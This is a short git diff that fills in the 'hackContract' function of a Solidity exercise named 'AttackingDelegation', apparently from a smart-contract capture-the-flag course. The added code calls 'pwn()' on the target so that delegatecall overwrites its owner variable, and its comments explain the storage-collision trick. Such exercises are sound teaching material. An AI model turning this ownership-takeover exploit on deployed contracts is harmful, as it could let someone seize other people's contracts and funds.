@@ -10,6 +10,9 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
-        // Code me!
+        // Simply call `pwn` since unknown func sig will trigger `fallback` in Delegation
+        // and delegatecall to Delegate with `pwn()` ad the called function
+        // Since bot hcontract share the same storage structure, `owner` will be overwritten with msg.sender
+        contractAddress.call(abi.encodeWithSignature("pwn()"));
     }
 }
